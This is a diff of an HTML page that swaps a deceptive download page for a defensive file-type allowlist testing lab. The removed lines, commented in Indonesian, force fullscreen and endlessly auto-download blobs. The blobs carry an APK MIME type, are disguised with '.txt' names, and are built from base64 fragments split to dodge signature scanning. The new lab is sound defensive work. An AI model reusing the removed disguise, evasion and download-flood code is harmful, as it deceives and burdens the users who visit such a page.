@@ -1,250 +1,392 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.4</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Type Allowlist Security Lab</title>
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
+* { box-sizing:border-box; margin:0; padding:0; }
+
 body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #090d16;
-  color: #f8fafc;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  padding: 20px;
+  font-family:system-ui,-apple-system,sans-serif;
+  background:#090d16;
+  color:#f8fafc;
+  min-height:100vh;
+  padding:24px;
+  display:flex;
+  justify-content:center;
 }
+
 .panel {
-  background: #111827;
-  padding: 32px;
-  border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
-  max-width: 540px;
-  width: 100%;
-  border: 1px solid #1f2937;
-  text-align: center;
+  width:100%;
+  max-width:850px;
+  background:#111827;
+  border:1px solid #263449;
+  border-radius:16px;
+  padding:26px;
 }
-:fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
+
+h2 { margin-bottom:8px; }
+.subtitle { color:#9ca3af; font-size:13px; margin-bottom:22px; }
+
+.section {
+  background:#0b1220;
+  border:1px solid #263449;
+  border-radius:10px;
+  padding:16px;
+  margin-top:15px;
 }
-:-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
+
+h3 { font-size:14px; margin-bottom:13px; }
+
+label {
+  display:block;
+  color:#9ca3af;
+  font-size:12px;
+  margin-bottom:6px;
 }
-h2 { 
-  margin-bottom: 10px; 
-  font-size: 22px;
-  color: #f3f4f6;
-  font-weight: 700;
+
+input,select {
+  width:100%;
+  padding:11px;
+  border-radius:7px;
+  border:1px solid #374151;
+  background:#111827;
+  color:white;
+  margin-bottom:12px;
 }
-p { 
-  margin-bottom: 24px; 
-  line-height: 1.6; 
-  color: #9ca3af;
-  font-size: 14px;
-}
+
 button {
-  width: 100%;
-  padding: 16px;
-  cursor: pointer;
-  border: none;
-  border-radius: 10px;
-  background: #3b82f6;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 16px;
-  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
-  transition: all 0.2s ease;
+  border:0;
+  border-radius:8px;
+  padding:12px 16px;
+  background:#2563eb;
+  color:white;
+  cursor:pointer;
+  font-weight:600;
+  margin:3px;
 }
-button:hover { 
-  background: #2563eb; 
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
+
+button:hover { background:#1d4ed8; }
+
+.secondary { background:#374151; }
+.secondary:hover { background:#4b5563; }
+
+#results {
+  overflow-x:auto;
 }
-button:active {
-  transform: translateY(0);
+
+table {
+  width:100%;
+  border-collapse:collapse;
+  font-size:12px;
+  min-width:500px;
 }
-#status {
-  margin-top: 20px;
-  font-weight: 500;
-  color: #38bdf8;
-  padding: 14px;
-  background: rgba(56, 189, 248, 0.1);
-  border-radius: 8px;
-  font-size: 13px;
-  border: 1px solid rgba(56, 189, 248, 0.2);
+
+th,td {
+  padding:11px;
+  border-bottom:1px solid #263449;
+  text-align:left;
 }
-#downloads {
-  margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-  padding-right: 4px;
+
+th { color:#93c5fd; }
+
+.pass { color:#4ade80; font-weight:bold; }
+.fail { color:#f87171; font-weight:bold; }
+.warn { color:#fbbf24; font-weight:bold; }
+
+#logs {
+  background:#030712;
+  color:#a7f3d0;
+  padding:13px;
+  border-radius:8px;
+  height:180px;
+  overflow:auto;
+  font-family:monospace;
+  font-size:11px;
+  line-height:1.8;
+  white-space:pre-wrap;
 }
-#downloads::-webkit-scrollbar {
-  width: 6px;
-}
-#downloads::-webkit-scrollbar-thumb {
-  background: #374151;
-  border-radius: 3px;
-}
-#downloads a {
-  display: block;
-  padding: 10px;
-  background: #1f2937;
-  color: #4ade80;
-  text-decoration: none;
-  border-radius: 6px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #374151;
-  word-break: break-all;
-  transition: border-color 0.15s;
-}
-#downloads a:hover {
-  border-color: #4ade80;
+
+.status {
+  margin-top:12px;
+  color:#38bdf8;
+  font-size:12px;
 }
 </style>
 </head>
 
 <body>
-<div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
+<main class="panel">
+  <h2>File Type Allowlist Security Lab</h2>
+  <p class="subtitle">
+    Controlled validation testing · Dummy files only · v3.0
+  </p>
 
-  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
+  <div class="section">
+    <h3>01 / Test Configuration</h3>
 
-  <div id="status" role="status">Sistem siap diinisialisasi.</div>
-  <div id="downloads"></div>
-</div>
+    <label>Filename</label>
+    <input id="filename" value="report.txt">
+
+    <label>Declared MIME Type</label>
+    <select id="mime">
+      <option value="text/plain">text/plain</option>
+      <option value="application/octet-stream">application/octet-stream</option>
+      <option value="application/pdf">application/pdf</option>
+      <option value="image/png">image/png</option>
+      <option value="application/zip">application/zip</option>
+    </select>
+
+    <label>Dummy file signature</label>
+    <select id="signature">
+      <option value="text">Plain text</option>
+      <option value="pdf">PDF signature</option>
+      <option value="png">PNG signature</option>
+      <option value="zip">ZIP signature</option>
+      <option value="unknown">Unknown signature</option>
+    </select>
+
+    <button onclick="runTest()">Run Validation</button>
+    <button class="secondary" onclick="runSuite()">Run Test Suite</button>
+  </div>
+
+  <div class="section">
+    <h3>02 / Validation Results</h3>
+    <div id="results">
+      <table>
+        <thead>
+          <tr>
+            <th>Filename</th>
+            <th>Extension</th>
+            <th>Client</th>
+            <th>Strict Validator</th>
+          </tr>
+        </thead>
+        <tbody id="resultBody">
+          <tr><td colspan="4">No tests executed.</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="status" id="status">Ready for testing.</p>
+  </div>
+
+  <div class="section">
+    <h3>03 / Evidence Log</h3>
+    <div id="logs">[INIT] Security lab initialized.</div>
+    <button onclick="exportLogs()">Export Evidence</button>
+    <button class="secondary" onclick="clearLogs()">Clear Logs</button>
+  </div>
+</main>
 
 <script>
-'use strict';
+"use strict";
 
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
+const $ = id => document.getElementById(id);
 
-let activeUrls = [];
-let isProcessing = false;
-const MAX_URLS_TRACKED = 40;
-
-// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
-const payloadFragments = [
-  "UEs",
-  "DBBQ",
-  "AAAAIAAAAIQ",
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
+const allowedExtensions = ["txt", "pdf", "png"];
+const allowedMimes = [
+  "text/plain",
+  "application/pdf",
+  "image/png"
 ];
 
-const assemblePayload = () => {
-  return payloadFragments.join("");
+const signatures = {
+  text: [0x54,0x45,0x53,0x54],
+  pdf: [0x25,0x50,0x44,0x46],
+  png: [0x89,0x50,0x4e,0x47],
+  zip: [0x50,0x4b,0x03,0x04],
+  unknown: [0x00,0x00,0x00,0x00]
 };
 
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
+const signatureMimes = {
+  text: "text/plain",
+  pdf: "application/pdf",
+  png: "image/png",
+  zip: "application/zip",
+  unknown: null
+};
+
+let evidence = [];
+
+function log(message) {
+  const time = new Date().toLocaleTimeString();
+  evidence.push(`[${time}] ${message}`);
+  $("logs").textContent = evidence.join("\n");
+  $("logs").scrollTop = $("logs").scrollHeight;
+}
+
+function getExtension(filename) {
+  const name = filename.split(/[\\/]/).pop();
+  const index = name.lastIndexOf(".");
+  return index < 0 ? "" : name.slice(index + 1).toLowerCase();
+}
+
+function inspectSignature(bytes) {
+  const hex = bytes
+    .map(b => b.toString(16).padStart(2,"0"))
+    .join(" ");
+
+  if (hex.startsWith("25 50 44 46")) return "pdf";
+  if (hex.startsWith("89 50 4e 47")) return "png";
+  if (hex.startsWith("50 4b 03 04")) return "zip";
+  if (hex.startsWith("54 45 53 54")) return "text";
+
+  return "unknown";
+}
+
+function clientValidation(filename, mime) {
+  const ext = getExtension(filename);
+
+  return {
+    allowed:
+      allowedExtensions.includes(ext) &&
+      allowedMimes.includes(mime),
+    extension: ext
+  };
+}
+
+function strictValidation(filename, mime, signature) {
+  const ext = getExtension(filename);
+  const expectedMime = signatureMimes[signature];
+
+  const valid =
+    allowedExtensions.includes(ext) &&
+    allowedMimes.includes(mime) &&
+    expectedMime !== null &&
+    mime === expectedMime &&
+    ext === signature;
+
+  return {
+    allowed: valid,
+    reason: valid
+      ? "All validation checks passed"
+      : "Extension, MIME, or signature mismatch"
+  };
+}
+
+function addResult(filename, ext, client, server) {
+  const row = document.createElement("tr");
+
+  function cell(value, className) {
+    const td = document.createElement("td");
+    td.textContent = value;
+    if (className) td.className = className;
+    return td;
   }
-  return bytes;
-};
 
-const prepareStealthBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    queueMicrotask(() => {
-      try {
-        const fullB64 = assemblePayload();
-        const bytesArr = decodeBase64ToBytes(fullB64);
-        
-        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
-        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
-      }
-    });
+  row.append(
+    cell(filename),
+    cell(ext || "(none)"),
+    cell(client.allowed ? "ALLOW" : "REJECT",
+      client.allowed ? "pass" : "fail"),
+    cell(server.allowed ? "ALLOW" : "REJECT",
+      server.allowed ? "pass" : "fail")
+  );
+
+  $("resultBody").appendChild(row);
+}
+
+function execute(filename, mime, signature) {
+  const bytes = signatures[signature];
+  const actualSignature = inspectSignature(bytes);
+
+  const client = clientValidation(filename, mime);
+  const server = strictValidation(
+    filename, mime, actualSignature
+  );
+
+  const ext = getExtension(filename);
+
+  addResult(filename, ext, client, server);
+
+  log(
+    `FILE=${filename} | MIME=${mime} | ` +
+    `SIGNATURE=${actualSignature} | ` +
+    `CLIENT=${client.allowed ? "ALLOW" : "REJECT"} | ` +
+    `STRICT=${server.allowed ? "ALLOW" : "REJECT"}`
+  );
+
+  if (client.allowed && !server.allowed) {
+    log("[FINDING] Client/server validation discrepancy detected.");
+  }
+
+  return { client, server };
+}
+
+function runTest() {
+  const filename = $("filename").value.trim();
+  const mime = $("mime").value;
+  const signature = $("signature").value;
+
+  if (!filename || filename.includes("/") ||
+      filename.includes("\\")) {
+    $("status").textContent = "Invalid filename.";
+    return;
+  }
+
+  execute(filename, mime, signature);
+  $("status").textContent = "Test completed.";
+}
+
+function runSuite() {
+  const tests = [
+    ["report.txt","text/plain","text"],
+    ["report.pdf","application/pdf","pdf"],
+    ["report.png","image/png","png"],
+    ["report.txt","application/pdf","pdf"],
+    ["report.pdf","text/plain","text"],
+    ["report.TXT","text/plain","text"],
+    ["report.txt.apk","text/plain","text"],
+    ["report.txt.html","text/plain","text"],
+    ["report.zip","application/zip","zip"],
+    ["report.txt","application/zip","zip"],
+    ["report","text/plain","text"],
+    ["report.exe","application/octet-stream","unknown"]
+  ];
+
+  $("resultBody").replaceChildren();
+  log("[SUITE] Starting controlled test suite.");
+
+  tests.forEach(test => {
+    execute(...test);
   });
-};
 
-const triggerStealthDownload = (fileData) => {
-  if (!fileData.success) return;
+  $("status").textContent =
+    `${tests.length} test cases completed.`;
+}
 
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
-  link.download = `laporan-catatan-${fileData.id}.txt`;
-  link.textContent = `Dokumen #${fileData.id} (.txt)`;
-  link.style.display = "none";
-  
-  downloadsDiv.appendChild(link);
-  link.click();
+function exportLogs() {
+  const content = [
+    "FILE TYPE ALLOWLIST SECURITY LAB",
+    "Evidence generated: " + new Date().toISOString(),
+    "",
+    ...evidence
+  ].join("\n");
 
-  // Batasi jumlah elemen DOM untuk menjaga performa rendering
-  if (downloadsDiv.children.length > 25) {
-    downloadsDiv.removeChild(downloadsDiv.firstChild);
-  }
-};
-
-const processLoop = async (counter) => {
-  if (!isProcessing) return;
-
-  const fileData = await prepareStealthBlobAsync(counter);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
-
-    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
-    }
-
-    triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
-  }
-
-  // Interval perulangan non-blocking
-  setTimeout(() => processLoop(counter + 1), 1200);
-};
-
-startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
+  const blob = new Blob([content], {
+    type:"text/plain"
   });
-  activeUrls = [];
-  downloadsDiv.replaceChildren();
 
-  const root = document.documentElement;
-  try {
-    if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
-    }
-  } catch (err) {}
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
 
-  isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi sesi unduhan...";
-  processLoop(1);
-});
+  a.href = url;
+  a.download = "allowlist-evidence.txt";
+  a.click();
+
+  setTimeout(() => URL.revokeObjectURL(url), 1000);
+  log("[EXPORT] Evidence exported.");
+}
+
+function clearLogs() {
+  evidence = [];
+  $("logs").textContent = "[RESET] Evidence cleared.";
+  $("resultBody").replaceChildren();
+  $("status").textContent = "Ready for testing.";
+}
+
 </script>
 </body>
 </html>
